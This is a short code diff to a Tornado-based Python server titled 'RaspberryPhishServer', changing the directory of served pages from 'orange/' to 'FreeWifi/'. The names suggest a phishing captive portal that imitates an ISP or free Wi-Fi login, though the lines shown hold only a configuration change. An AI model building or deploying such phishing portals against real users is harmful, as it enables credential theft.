@@ -3,7 +3,7 @@
 __title__ = "RaspberryPhishServer"
 
 # var : directory name where the server will load in "pages" and "rsc"
-pagePath = "orange/"
+pagePath = "FreeWifi/"
 
 
 import tornado.ioloop
